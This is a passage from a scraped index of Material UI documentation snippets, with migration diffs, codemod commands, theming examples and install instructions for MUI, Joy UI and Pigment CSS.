diff\nCODE:\n```\n-import { convertHexToRgb } from '@material-ui/core/styles/colorManipulator';\n+import { hexToRgb } from '@material-ui/core/styles';\n```\n\n----------------------------------------\n\nTITLE: Migrating Backdrop TransitionComponent Prop\nDESCRIPTION: Shows how to migrate the Backdrop TransitionComponent prop to the newer slots pattern for specifying custom transitions.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n <Backdrop\n-  TransitionComponent={CustomTransition}\n+  slots={{ transition: CustomTransition }}\n />\n```\n\n----------------------------------------\n\nTITLE: Updating styled Import for Pigment CSS\nDESCRIPTION: This snippet shows how to update the import statement for the styled function to use Pigment CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n-import { styled } from '@mui/material/styles';\n+import { styled } from '@mui/material-pigment-css';\n```\n\n----------------------------------------\n\nTITLE: Optimal Imports Codemod Example\nDESCRIPTION: This codemod fixes private import paths by converting them to use the recommended public import paths, making code more maintainable and compatible with tree-shaking.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_104\n\nLANGUAGE: diff\nCODE:\n```\n-import red from '@material-ui/core/colors/red';\n-import createTheme from '@material-ui/core/styles/createTheme';\n+import { red } from '@material-ui/core/colors';\n+import { createTheme } from '@material-ui/core/styles';\n```\n\n----------------------------------------\n\nTITLE: Implementing Inline Display in Material-UI\nDESCRIPTION: Example of using the Box component with inline display property. This sets elements to display inline, allowing them to sit next to each other horizontally.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"div\" sx={{ display: 'inline' }}>inline</Box>\n<Box component=\"div\" sx={{ display: 'inline' }}>inline</Box>\n```\n\n----------------------------------------\n\nTITLE: List Component HTML Structure\nDESCRIPTION: Shows the HTML structure generated by the List component hierarchy, including ListItem, ListItemButton, ListItemDecorator, and ListItemContent components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<ul class=\"MuiList-root\">\n  <li class=\"MuiListItem-root\">\n    <div class=\"MuiListItemButton-root\" role=\"button\">\n      <span class=\"MuiListItemDecorator-root\">\n        <!-- Icon for List Item Decorator -->\n      </span>\n      <div class=\"MuiListItemContent-root\">\n        <!-- List Item content -->\n      </div>\n    </div>\n  </li>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Theme Behavior with CSS Variables in Material-UI\nDESCRIPTION: Illustrates how the theme object remains constant when using CSS variables with light and dark color schemes, even when the color mode changes. The mode state from useColorScheme changes, but the theme.palette.mode remains the same.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nimport {\n  ThemeProvider,\n  createTheme,\n  useTheme,\n  useColorScheme,\n} from '@mui/material/styles';\n\nconst theme = createTheme({\n  cssVariables: {\n    colorSchemeSelector: 'class',\n  },\n  colorSchemes: {\n    light: true,\n    dark: true,\n  },\n});\nconsole.log(theme.palette.mode); // 'light' is the default mode\n\nfunction ColorModeToggle() {\n  const { setMode, mode } = useColorScheme();\n  const theme = useTheme();\n\n  React.useEffect(() => {\n    console.log(mode); // logged 'light' at first render, and 'dark' after the button click\n  }, [mode]);\n\n  React.useEffect(() => {\n    // logged 'light' at first render, no log after the button click\n    console.log(theme.palette.mode);\n  }, [theme]);\n\n  return <button onClick={() => setMode('dark')}>Toggle dark mode</button>;\n}\n\nfunction App() {\n  return (\n    <ThemeProvider theme={theme}>\n      <ColorModeToggle />\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Default Chip Variant Prop in React\nDESCRIPTION: Removes the Chip 'variant' prop if the value is 'default'. This codemod simplifies Chip component usage in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_73\n\nLANGUAGE: diff\nCODE:\n```\n-<Chip variant=\"default\">\n+<Chip>\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/chip-variant-prop <path>\n```\n\n----------------------------------------\n\nTITLE: Updating CssBaseline Styling\nDESCRIPTION: Migrates CssBaseline component to use @mui/styled-engine and updates styling syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n   components: {\n     MuiCssBaseline: {\n-      styleOverrides: {\n-        '@global': {\n-          html: {\n-            WebkitFontSmoothing: 'auto',\n-          },\n-        },\n-      },\n+      styleOverrides: `\n+        html {\n+          -webkit-font-smoothing: auto;\n+        }\n+      `\n     },\n   },\n });\n```\n\n----------------------------------------\n\nTITLE: Markdown Blog Post Frontmatter\nDESCRIPTION: YAML frontmatter configuration for a blog post about MUI's 2021 developer survey results, including metadata like title, description, date, authors, and tags.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-developer-survey-results.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: 'The 2021 MUI Developer Survey: here's what we discovered'\ndescription: Your feedback helps us to build better products. Here's what we learned about your needs in our annual survey.\ndate: 2022-03-15T00:00:00.000Z\nauthors: ['danilo-leal', 'samuelsycamore', 'oliviertassinari']\ntags: ['Developer Survey']\nmanualCard: true\n---\n```\n\n----------------------------------------\n\nTITLE: Updating Tree View imports from @mui/lab to @mui/x-tree-view\nDESCRIPTION: This codemod updates the imports of Tree View from '@mui/lab' to '@mui/x-tree-view'. It helps migrate to the new package structure for the Tree View component.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_70\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/tree-view-moved-to-x <path>\n```\n\n----------------------------------------\n\nTITLE: Configuring no-restricted-imports for MUI Projects\nDESCRIPTION: Configuration example for using the standard ESLint no-restricted-imports rule as a replacement for the deprecated restricted-path-imports rule. This configuration prevents imports from deeply nested MUI module paths.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/eslint-plugin-material-ui/README.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"rules\": {\n    \"no-restricted-imports\": [\n      \"error\",\n      {\n        \"patterns\": [\"@mui/*/*/*\"]\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Small-Sized Slider in React\nDESCRIPTION: Shows how to implement a smaller-sized slider using the 'size' prop set to 'small' in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"SliderSizes.js\"}\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI v5 and Styles Package with npm\nDESCRIPTION: Command to install the main Material UI v5 package and the styles package which provides backward compatibility with JSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material @mui/styles\n```\n\n----------------------------------------\n\nTITLE: Updating jssPreset Import Path\nDESCRIPTION: Diff showing the updated import path for jssPreset, which was moved from @mui/material/styles to @mui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_28\n\nLANGUAGE: diff\nCODE:\n```\n-import { jssPreset } from '@mui/material/styles';\n+import { jssPreset } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Renaming Table padding prop value in React\nDESCRIPTION: Renames the 'default' value of the padding prop to 'normal' for Table and TableCell components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_29\n\nLANGUAGE: diff\nCODE:\n```\n-<Table padding=\"default\" />\n-<TableCell padding=\"default\" />\n+<Table padding=\"normal\" />\n+<TableCell padding=\"normal\" />\n```\n\n----------------------------------------\n\nTITLE: Rendering Default Theme Viewer in React\nDESCRIPTION: This code snippet demonstrates how to render the JoyDefaultTheme component, which displays the default theme object for Material-UI. It uses the 'demo' property to specify the component and includes additional configuration options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/default-theme-viewer/default-theme-viewer.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"demo\": \"JoyDefaultTheme.js\", \"hideToolbar\": true, \"bg\": \"inline\"}\n```\n\n----------------------------------------\n\nTITLE: Starting Next.js Development Server\nDESCRIPTION: Command to start the Next.js development server for the Pigment CSS demo application.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-next-app/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npnpm run --filter=@app/pigment-css-next-app dev\n```\n\n----------------------------------------\n\nTITLE: System Props Migration Codemod (v6.0.0)\nDESCRIPTION: Moves system props into the sx prop for better compatibility and consistency.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_66\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/system-props <path>\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<Box ml=\"2px\" py={1} color=\"primary.main\" />\n+<Box sx={{ ml: '2px', py: 1, color: 'primary.main' }} />\n```\n\n----------------------------------------\n\nTITLE: Building Production Application\nDESCRIPTION: Command to build the Pigment CSS Next.js demo application for production deployment.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-next-app/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\npnpm run --filter=@app/pigment-css-next-app build\n```\n\n----------------------------------------\n\nTITLE: Updating Info Color Usage\nDESCRIPTION: Diff showing migration from info to neutral color in Chip component\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n- <Chip color=\"info\" variant=\"soft\">\n+ <Chip color=\"neutral\" variant=\"soft\">\n```\n\n----------------------------------------\n\nTITLE: Setting CSS Injection Order for Material UI and Tailwind\nDESCRIPTION: React component setup to ensure correct CSS injection order, giving precedence to Tailwind CSS over Material UI styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport { StyledEngineProvider } from '@mui/material/styles';\n\nexport default function GlobalCssPriority() {\n  return (\n    <StyledEngineProvider injectFirst>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </StyledEngineProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Running Grid Codemod with Custom Breakpoints for Material UI v6\nDESCRIPTION: Command to run the Grid migration codemod with custom breakpoint names provided as an argument, allowing the tool to properly update non-standard breakpoint props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder> --jscodeshift='--muiBreakpoints=mobile,desktop'\n```\n\n----------------------------------------\n\nTITLE: Runtime-Based Styling\nDESCRIPTION: Example of styling components based on runtime values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconst Heading = styled('h1')({\n  color: ({ isError }) => (isError ? 'red' : 'black'),\n});\n```\n\n----------------------------------------\n\nTITLE: Installing React Type Declarations with Package Manager\nDESCRIPTION: Command examples for installing React type declarations with different package managers (npm, pnpm, yarn), where <version> should be replaced with the major version of React being used.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @types/react@<version> @types/react-dom@<version>\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @types/react@<version> @types/react-dom@<version>\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @types/react@<version> @types/react-dom@<version>\n```\n\n----------------------------------------\n\nTITLE: Select Decorator Event Handler\nDESCRIPTION: Example of stopping event propagation for interactive decorators in Select component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/select/select.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<IconButton\n  onMouseDown={(event) => {\n    // don't open the popup when clicking on this button\n    event.stopPropagation();\n  }}\n  onClick={() => {\n    // click handler goes here\n  }\n>...</IconButton>\n```\n\n----------------------------------------\n\nTITLE: Using TSS with Material UI Components\nDESCRIPTION: Example of using TSS (tss-react) to create styles for Material UI components, demonstrating TypeScript integration and dynamic styling based on props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_25\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport { makeStyles } from 'tss-react/mui';\n\nexport function MyComponent(props: Props) {\n  const { className } = props;\n\n  const [color, setColor] = useState<'red' | 'blue'>('red');\n\n  const { classes, cx } = useStyles({ color });\n\n  return <span className={cx(classes.root, className)}>hello world</span>;\n}\n\nconst useStyles = makeStyles<{ color: 'red' | 'blue' }>()((theme, { color }) => ({\n  root: {\n    color,\n    '&:hover': {\n      backgroundColor: theme.palette.primary.main,\n    },\n  },\n}));\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Definition for Joy UI Component\nDESCRIPTION: Defines TypeScript interfaces for component props and ownerState, including proper type definitions for theme integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\ninterface StatProps {\n  value: number | string;\n  unit: string;\n  variant?: 'outlined';\n}\n\ninterface StatOwnerState extends StatProps {\n  // …key value pairs for the internal state that you want to style the slot\n  // but don't want to expose to the users\n}\n\ndeclare module '@mui/joy/styles' {\n  interface Components {\n    JoyStat?: {\n      defaultProps?: Partial<StatProps>;\n      styleOverrides?: StyleOverrides<StatProps, StatOwnerState, Theme>;\n    };\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Joy UI Peer Dependencies Configuration\nDESCRIPTION: The peer dependencies configuration showing required React and React DOM versions for Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/installation/installation.md#2025-04-22_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"peerDependencies\": {\n  \"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\",\n  \"react-dom\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"\n},\n```\n\n----------------------------------------\n\nTITLE: Running Chip Classes Codemod Command\nDESCRIPTION: Command to automatically update deprecated Chip class names in a codebase using MUI's codemod tool. This transforms old class naming patterns to the new pattern consistently.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/chip-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Configuring TypeScript for Material-UI Theme Variables\nDESCRIPTION: Demonstrates how to enable TypeScript typings for theme variables in Material-UI. This includes importing the necessary module augmentation and showing a typed-safe usage example.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_5\n\nLANGUAGE: ts\nCODE:\n```\n// The import can be in any file that is included in your `tsconfig.json`\nimport type {} from '@mui/material/themeCssVarsAugmentation';\nimport { styled } from '@mui/material/styles';\n\nconst StyledComponent = styled('button')(({ theme }) => ({\n  // ✅ typed-safe\n  color: theme.vars.palette.primary.main,\n}));\n```\n\n----------------------------------------\n\nTITLE: Creating Collapsible Content Section in Markdown\nDESCRIPTION: This snippet demonstrates how to create a collapsible content section in Markdown using HTML details and summary tags. It includes a table with survey result breakdowns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-developer-survey-results.md#2025-04-22_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n<details>\n  <summary>Click to see the breakdown of categories.</summary>\n\n<table>\n  <tr><th style=\"width: 40px;\">597</th><th style=\"width: 700px;\">time</th><tr>\n  <tr><th>407</th><th>design</th><tr>\n  <tr><td>148</td><td>design - look & feel</td><tr>\n  <!-- ... more table rows ... -->\n</table>\n</details>\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Margins to Stack Children (Unsupported Example)\nDESCRIPTION: Example showing that direct margin styling on Stack children is not supported by default and will be ignored.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/stack/stack.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack>\n  <button style={{ marginTop: '30px' }}>...</button>\n</Stack>\n```\n\n----------------------------------------\n\nTITLE: Applying Dark Styles to Material-UI Card Component\nDESCRIPTION: Demonstrates how to customize styles for dark mode using the theme.applyStyles() function. This example shows how to change the background color of a Card component in dark mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport Card from '@mui/material/Card';\n\n<Card\n  sx={[\n    (theme) => ({\n      backgroundColor: theme.vars.palette.background.default,\n    }),\n    (theme) =>\n      theme.applyStyles('dark', {\n        backgroundColor: theme.vars.palette.grey[900],\n      }),\n  ]}\n/>;\n```\n\n----------------------------------------\n\nTITLE: Basic Transfer List Demo Reference\nDESCRIPTION: Reference to a basic transfer list implementation that includes 'move all' buttons for transferring items between lists.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/transfer-list/transfer-list.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{\"demo\": \"TransferList.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Removing Dialog Backdrop Click Prop in React\nDESCRIPTION: Removes the 'disableBackdropClick' prop from Dialog component. This codemod aligns the Dialog component with the updated API in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_79\n\nLANGUAGE: diff\nCODE:\n```\n-<Dialog disableBackdropClick />\n+<Dialog />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/dialog-props <path>\n```\n\n----------------------------------------\n\nTITLE: Creating Error Callout Block - Markup\nDESCRIPTION: Demonstrates an error callout using ':::error' in documentation markup, meant to signify critical warnings or failure states to users. The content supports markdown formatting such as bold text, code snippets, and hyperlinks. Usage assumes a renderer capable of understanding container directives. Used to provide non-interactive but highly visible alerts in documentation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/callouts.md#2025-04-22_snippet_3\n\nLANGUAGE: markup\nCODE:\n```\n:::error\\nThis is an error callout.\\nIt says, \\\"You will fail if you don't heed this dire warning.\\\"\\n\\n- emphasised: **bold text**\\n- some code `<div/>`\\n- a [link](#link).\\n:::\n```\n\n----------------------------------------\n\nTITLE: Updating Chip Variant\nDESCRIPTION: Renames Chip 'default' variant to 'filled' for consistency with other components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n-<Chip variant=\"default\">\n+<Chip>\n```\n\n----------------------------------------\n\nTITLE: Using Codemod for Grid Props Migration in v6\nDESCRIPTION: Command to run the codemod for automatically updating Grid props to the new format in Material UI v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Material-UI Versions in Markdown\nDESCRIPTION: This markdown table shows the different versions of Material-UI, their release dates, and current support status for security updates. It uses checkmarks and x marks to indicate support status.\nSOURCE: https://github.com/mui/material-ui/blob/master/SECURITY.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Material UI version | Release    | Supported                            |\n| ------------------: | :--------- | :----------------------------------- |\n|              ^6.0.0 | 2024-08-26 | :white_check_mark: Stable major      |\n|              ^5.0.0 | 2021-09-16 | :white_check_mark: Long-term support |\n|              ^4.0.0 | 2019-06-23 | :x:                                  |\n|              ^3.0.0 | 2018-08-27 | :x:                                  |\n|              ^2.0.0 | /          | :x:                                  |\n|              ^1.0.0 | 2018-06-18 | :x:                                  |\n|             <=1.0.0 | 2014-10-05 | :x:                                  |\n```\n\n----------------------------------------\n\nTITLE: Updating TableCell Alignment\nDESCRIPTION: Migration from deprecated numeric prop to align prop for right alignment.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_20\n\nLANGUAGE: diff\nCODE:\n```\n-<TableCell numeric>{row.calories}</TableCell>\n+<TableCell align=\"right\">{row.calories}</TableCell>\n```\n\n----------------------------------------\n\nTITLE: Updating Date and Time Pickers imports from @mui/lab to @mui/x-date-pickers\nDESCRIPTION: This codemod updates the imports of Date and Time Pickers from '@mui/lab' to '@mui/x-date-pickers' and '@mui/x-date-pickers-pro'. It helps migrate to the new package structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_69\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/date-pickers-moved-to-x <path>\n```\n\n----------------------------------------\n\nTITLE: Migrating Deprecated sx Prop Callback Syntax\nDESCRIPTION: Shows the deprecated syntax where a callback was used for an individual `sx` property value and contrasts it with the recommended pattern where the entire `sx` prop value is a callback returning a style object.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n- sx={{ height: (theme) => theme.spacing(10) }}\n+ sx={(theme) => ({ height: theme.spacing(10) })}\n```\n\n----------------------------------------\n\nTITLE: Importing Unstyled Slider Component from Material-UI Lab\nDESCRIPTION: This code snippet shows how to import the unstyled version of the Slider component from the Material-UI lab. This lightweight version allows for full customization of appearance while retaining core functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport SliderUnstyled from '@mui/lab/SliderUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Lab Package with Yarn\nDESCRIPTION: Command to add the MUI Lab package using Yarn, which is needed if you were previously using @material-ui/lab.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/lab\n```\n\n----------------------------------------\n\nTITLE: Updating MuiThemeProvider to ThemeProvider\nDESCRIPTION: Diff showing the replacement of MuiThemeProvider with ThemeProvider.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_27\n\nLANGUAGE: diff\nCODE:\n```\n-import { MuiThemeProvider } from '@mui/material/styles';\n+import { ThemeProvider } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Setting up Storybook Preview with ThemeProvider for Material UI v5\nDESCRIPTION: Configures the Storybook preview to use both Emotion and Material UI theme providers. This prevents the Docs tab from displaying an empty page when using Material UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n// .storybook/preview.js\n\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\nimport { ThemeProvider as Emotion10ThemeProvider } from 'emotion-theming';\n\nconst defaultTheme = createTheme(); // or your custom theme\n\nconst withThemeProvider = (Story, context) => {\n  return (\n    <Emotion10ThemeProvider theme={defaultTheme}>\n      <ThemeProvider theme={defaultTheme}>\n        <Story {...context} />\n      </ThemeProvider>\n    </Emotion10ThemeProvider>\n  );\n};\n\nexport const decorators = [withThemeProvider];\n\n// ...other storybook exports\n```\n\n----------------------------------------\n\nTITLE: Watching Pigment CSS Package Changes\nDESCRIPTION: Command to watch and automatically rebuild Pigment CSS package files during development.\nSOURCE: https://github.com/mui/material-ui/blob/master/apps/pigment-css-next-app/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npnpm watch:zero\n```\n\n----------------------------------------\n\nTITLE: Renaming Omit Type in @mui/types for Material-UI v5\nDESCRIPTION: This snippet shows how to update the import statement for the renamed Omit type, now called DistributiveOmit, in the @mui/types module for Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_53\n\nLANGUAGE: diff\nCODE:\n```\n-import { Omit } from '@mui/types';\n+import { DistributiveOmit } from '@mui/types';\n```\n\n----------------------------------------\n\nTITLE: Running Codemod for Tree View Migration\nDESCRIPTION: This bash command runs a codemod to automatically migrate Tree View imports from @mui/lab to @mui/x-tree-view across a codebase.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/lab-tree-view-to-mui-x.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/tree-view-moved-to-x <path>\n```\n\n----------------------------------------\n\nTITLE: Setting HTML Direction Attribute Globally\nDESCRIPTION: Add the dir=\"rtl\" attribute to the root HTML element to set right-to-left text direction across the entire application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html dir=\"rtl\"></html>\n```\n\n----------------------------------------\n\nTITLE: Removing disableEqualOverflow Prop from Grid in React\nDESCRIPTION: Migration example for removing the disableEqualOverflow prop from Grid components, as it's no longer needed in v6 where Grid is contained within its parent's padding by default.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid disableEqualOverflow>\n+<Grid>\n```\n\n----------------------------------------\n\nTITLE: Configuring Mode Toggle with CSS Variables in Material-UI (JavaScript)\nDESCRIPTION: This snippet provides an example of a React component enabling theme mode toggling with Material-UI using CSS variables for full isolation. The ThemeProvider is configured with colorSchemes and a cssVariables object, using props to define custom CSS variable prefixes and selectors. Dependencies include @mui/material/styles and the respective props for theming; inputs involve cssVarPrefix and colorSchemeSelector, while output is an isolated themed section. System mode is defaulted on page refresh, and mode is not stored in localStorage.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/demos.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { ThemeProvider, createTheme, useColorScheme } from '@mui/material/styles';\\n\\nfunction ModeToggle() {\\n  const { mode, setMode } = useColorScheme();\\n}\\n\\nexport default function DemoModeToggle(props) {\\n  return (\\n    <ThemeProvider\\n      {...props}\\n      theme={createTheme({\\n        colorSchemes: { light: true, dark: true },\\n        cssVariables: {\\n          // required to make the demo isolated\\n          cssVarPrefix: props.cssVarPrefix,\\n          colorSchemeSelector: props.colorSchemeSelector || 'class',\\n        },\\n      })}\\n    >\\n      ...\\n    </ThemeProvider>\\n  );\\n}\\n\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons with NPM\nDESCRIPTION: Command to install Material Icons and Material UI packages using NPM, with webpack configuration for aliasing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/icon-libraries/icon-libraries.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material @mui/material\n```\n\nLANGUAGE: diff\nCODE:\n```\n module.exports = {\n   //...\n+  resolve: {\n+    alias: {\n+      '@mui/material': '@mui/joy',\n+    },\n+  },\n };\n```\n\nLANGUAGE: diff\nCODE:\n```\n {\n   \"compilerOptions\": {\n+    \"paths\": {\n+      \"@mui/material\": [\"./node_modules/@mui/joy\"]\n+    }\n   }\n }\n```\n\n----------------------------------------\n\nTITLE: Providing Per-Field Functions in styled vs. sx (Not Recommended) - JavaScript\nDESCRIPTION: Demonstrates that styled does not support per-field property functions for style fields (as seen in syntax 'backgroundColor: (props) => ...'); this usage is discouraged for readability. Instead, one top-level function should be used. The sx prop, however, allows functions per style property. Dependencies include MUI's Emotion or styled-components engine for styled, and @mui/material for sx.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n// You may find this syntax in the wild, but for code readability\n// we recommend using only one top-level function\nconst MyStyledButtonPropsPerField = styled('button')({\n  backgroundColor: (props) => props.myBackgroundColor,\n});\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport Button from '@mui/material/Button';\nimport { lighten } from 'polished';\n\nconst MyStyledButton = (props) => (\n  <Button\n    sx={{ backgroundColor: (theme) => 